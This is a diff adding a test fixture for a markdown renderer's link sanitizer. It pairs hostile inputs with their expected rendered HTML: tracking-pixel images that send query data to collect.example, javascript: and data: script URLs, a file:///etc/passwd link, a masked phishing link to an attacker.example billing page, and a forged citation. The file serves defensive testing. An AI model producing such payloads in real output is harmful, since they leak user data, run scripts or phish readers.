@@ -1,0 +1,40 @@
+image
+  in : ![preview](https://collect.example/pixel.png?q=225g-butter)
+  out: <div class="md"><p>!<a href="https://collect.example/pixel.png?q=225g-butter" class="md-link" title="https://collect.example/pixel.png?q=225g-butter" rel="noreferrer noopener">preview</a></p></div>
+  safeHref: https://collect.example/pixel.png?q=225g-butter
+html_img
+  in : <img src="https://collect.example/a.png?q=secret">
+  out: <div class="md"><p>&lt;img src=&quot;<a href="https://collect.example/a.png?q=secret" class="md-link" title="https://collect.example/a.png?q=secret" rel="noreferrer noopener">https://collect.example/a.png?q=secret</a>&quot;&gt;</p></div>
+  safeHref: null
+js_link
+  in : [click](javascript:alert(1))
+  out: <div class="md"><p><span class="md-link-text">click</span></p></div>
+  safeHref: null
+data_link
+  in : [x](data:text/html,<script>alert(1)</script>)
+  out: <div class="md"><p><span class="md-link-text">x</span></p></div>
+  safeHref: null
+http_link
+  in : [pay now](http://lumen-pay-now.example/verify)
+  out: <div class="md"><p><span class="md-link-text">pay now (http://lumen-pay-now.example/verify)</span></p></div>
+  safeHref: null
+https_masked
+  in : [Lumen Fiber billing portal](https://lumen-pay-now.attacker.example/verify?acct=1234)
+  out: <div class="md"><p><a href="https://lumen-pay-now.attacker.example/verify?acct=1234" class="md-link" title="https://lumen-pay-now.attacker.example/verify?acct=1234" rel="noreferrer noopener">Lumen Fiber billing portal</a></p></div>
+  safeHref: https://lumen-pay-now.attacker.example/verify?acct=1234
+bare_https
+  in : Pay at https://lumen-pay-now.attacker.example/verify today
+  out: <div class="md"><p>Pay at <a href="https://lumen-pay-now.attacker.example/verify" class="md-link" title="https://lumen-pay-now.attacker.example/verify" rel="noreferrer noopener">https://lumen-pay-now.attacker.example/verify</a> today</p></div>
+  safeHref: null
+file_link
+  in : [open](file:///etc/passwd)
+  out: <div class="md"><p><span class="md-link-text">open</span></p></div>
+  safeHref: null
+obsidian_link
+  in : [note](obsidian://open?vault=x&file=y)
+  out: <div class="md"><p><span class="md-link-text">note</span></p></div>
+  safeHref: null
+cite_forged
+  in : The permit is revoked [2][7].
+  out: <div class="md"><p>The permit is revoked <button type="button" class="cite" aria-label="source 2">[2]</button>[7].</p></div>
+  safeHref: null
